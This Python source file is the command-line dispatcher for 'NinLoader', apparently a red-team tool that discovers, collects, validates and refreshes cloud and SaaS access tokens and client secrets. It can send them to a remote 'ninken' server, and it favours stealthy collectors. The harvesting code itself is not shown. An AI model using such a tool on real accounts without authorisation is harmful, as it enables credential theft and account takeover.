"""NinLoader CLI — argparse-based command dispatcher."""

from __future__ import annotations

import argparse
import json
import sys
from typing import List, Optional

from . import __version__
from .types import CollectedToken


BANNER = r"""
  _   _ _       _                    _
 | \ | (_)_ __ | |    ___   __ _  __| | ___ _ __
 |  \| | | '_ \| |   / _ \ / _` |/ _` |/ _ \ '__|
 | |\  | | | | | |__| (_) | (_| | (_| |  __/ |
 |_| \_|_|_| |_|_____\___/ \__,_|\__,_|\___|_|
                                        v{version}
 Universal Token Collector — Ninken Red Team Platform
""".format(version=__version__)


def cmd_discover(args):
    """Run token discovery across all registered collectors."""
    from .core.discovery import DiscoveryEngine

    engine = DiscoveryEngine()
    tokens = engine.run(service_filter=args.service)

    if args.json:
        print(engine.format_json(tokens))
    else:
        if not args.quiet:
            print(BANNER, file=sys.stderr)
        print(engine.format_table(tokens))


def cmd_collect(args):
    """Collect tokens from specified or all sources."""
    from .collectors import CollectorRegistry
    from .core.output import get_output_handler

    if not args.quiet:
        print(BANNER, file=sys.stderr)

    results: List[CollectedToken] = []

    if args.service and args.source:
        # Specific collector
        collector_cls = CollectorRegistry.get(args.service, args.source)
        if not collector_cls:
            print(f"Error: No collector found for {args.service}/{args.source}", file=sys.stderr)
            sys.exit(1)

        collector = collector_cls()
        if not collector.is_platform_supported():
            print(f"Error: {args.service}/{args.source} not supported on this platform", file=sys.stderr)
            sys.exit(1)

        missing = collector.check_dependencies()
        if missing:
            print(f"Warning: Missing optional dependencies: {', '.join(missing)}", file=sys.stderr)

        results = collector.collect()

    elif args.service:
        # All sources for a service
        for (svc, src), collector_cls in CollectorRegistry.get_all().items():
            if svc != args.service:
                continue
            collector = collector_cls()
            if not collector.is_platform_supported():
                continue
            try:
                results.extend(collector.collect())
            except Exception as e:
                print(f"[WARN] {svc}/{src} failed: {e}", file=sys.stderr)

    else:
        # All services, all sources
        for (svc, src), collector_cls in CollectorRegistry.get_all().items():
            collector = collector_cls()
            if not collector.is_platform_supported():
                continue
            # Skip interactive collectors in batch mode
            if collector.stealth_score < 4:
                continue
            try:
                results.extend(collector.collect())
            except Exception as e:
                print(f"[WARN] {svc}/{src} failed: {e}", file=sys.stderr)

    # Output
    output_type = args.output or "stdout"
    handler = get_output_handler(
        output_type,
        path=args.path,
        ninken_url=args.ninken_url,
    )

    handler.write(results)

    if not args.quiet:
        print(f"\nCollected {len(results)} token(s).", file=sys.stderr)


def cmd_validate(args):
    """Validate tokens from a JSON file."""
    from .core.validator import validate_token

    if not args.quiet:
        print(BANNER, file=sys.stderr)

    try:
        with open(args.file, "r") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Error reading {args.file}: {e}", file=sys.stderr)
        sys.exit(1)

    if isinstance(data, dict):
        data = [data]

    from .secure import secure

    for entry in data:
        token_data = entry.get("token", entry)
        account_data = entry.get("account", {})
        collector_data = entry.get("collector", {})

        token = CollectedToken(
            service=collector_data.get("service", token_data.get("platform", "unknown")),
            source=collector_data.get("source", "file"),
            username=account_data.get("username"),
            access_token=secure(token_data.get("access_token", "")) if token_data.get("access_token") else None,
            refresh_token=secure(token_data.get("refresh_token", "")) if token_data.get("refresh_token") else None,
            expires_at=token_data.get("expires_at"),
        )

        result = validate_token(token)
        print(result.summary())


def cmd_refresh(args):
    """Refresh tokens from a JSON file."""
    from .core.refresh import refresh_token
    from .core.output import get_output_handler
    from .secure import secure

    if not args.quiet:
        print(BANNER, file=sys.stderr)

    try:
        with open(args.file, "r") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Error reading {args.file}: {e}", file=sys.stderr)
        sys.exit(1)

    if isinstance(data, dict):
        data = [data]

    refreshed: List[CollectedToken] = []

    for entry in data:
        token_data = entry.get("token", entry)
        account_data = entry.get("account", {})
        collector_data = entry.get("collector", {})

        token = CollectedToken(
            service=collector_data.get("service", token_data.get("platform", "unknown")),
            source=collector_data.get("source", "file"),
            username=account_data.get("username"),
            tenant_id=account_data.get("tenant_id"),
            access_token=secure(token_data.get("access_token", "")) if token_data.get("access_token") else None,
            refresh_token=secure(token_data.get("refresh_token", "")) if token_data.get("refresh_token") else None,
            client_id=token_data.get("client_id"),
            client_secret=secure(token_data.get("client_secret", "")) if token_data.get("client_secret") else None,
            token_uri=token_data.get("token_uri"),
            scopes=token_data.get("scopes"),
            foci=token_data.get("foci", False),
        )

        result = refresh_token(token)
        print(result.summary(), file=sys.stderr)

        if result.success and result.new_token:
            refreshed.append(result.new_token)

    if refreshed:
        output_type = args.output or "stdout"
        handler = get_output_handler(output_type, path=args.path)
        handler.write(refreshed)


def main():
    # Shared parent parser for common flags
    parent = argparse.ArgumentParser(add_help=False)
    parent.add_argument("-q", "--quiet", action="store_true", help="Suppress banner and info messages")

    parser = argparse.ArgumentParser(
        prog="ninloader",
        description="NinLoader — Universal Token Collector CLI",
        parents=[parent],
    )
    parser.add_argument("--version", action="version", version=f"ninloader {__version__}")

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # --- discover ---
    p_discover = subparsers.add_parser("discover", help="Discover available token sources", parents=[parent])
    p_discover.add_argument("--service", help="Filter by service (aws, google, github, microsoft, slack)")
    p_discover.add_argument("--json", action="store_true", help="Output as JSON")

    # --- collect ---
    p_collect = subparsers.add_parser("collect", help="Collect tokens from sources", parents=[parent])
    p_collect.add_argument("--service", help="Service to collect from (aws, google, github, microsoft, slack)")
    p_collect.add_argument("--source", help="Specific source (env, credentials, gh_cli, etc.)")
    p_collect.add_argument("--output", choices=["file", "stdout", "clipboard", "ninken"], default="stdout",
                          help="Output destination (default: stdout)")
    p_collect.add_argument("--path", help="Output directory for file output (default: ./tokens)")
    p_collect.add_argument("--account", help="Account hint for interactive collectors")
    p_collect.add_argument("--tenant", help="Tenant ID for Microsoft collectors")
    p_collect.add_argument("--client", help="Client ID or FOCI client name")
    p_collect.add_argument("--scopes", help="Comma-separated scopes for interactive collectors")
    p_collect.add_argument("--client-secret", help="Client secret for OAuth flows")
    p_collect.add_argument("--ninken-url", help="Ninken server URL for ninken output")

    # --- validate ---
    p_validate = subparsers.add_parser("validate", help="Validate tokens from a JSON file", parents=[parent])
    p_validate.add_argument("--file", required=True, help="Path to token JSON file")

    # --- refresh ---
    p_refresh = subparsers.add_parser("refresh", help="Refresh tokens from a JSON file", parents=[parent])
    p_refresh.add_argument("--file", required=True, help="Path to token JSON file")
    p_refresh.add_argument("--output", choices=["file", "stdout", "clipboard", "ninken"], default="stdout",
                          help="Output destination for refreshed tokens")
    p_refresh.add_argument("--path", help="Output directory for file output")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    commands = {
        "discover": cmd_discover,
        "collect": cmd_collect,
        "validate": cmd_validate,
        "refresh": cmd_refresh,
    }

    commands[args.command](args)
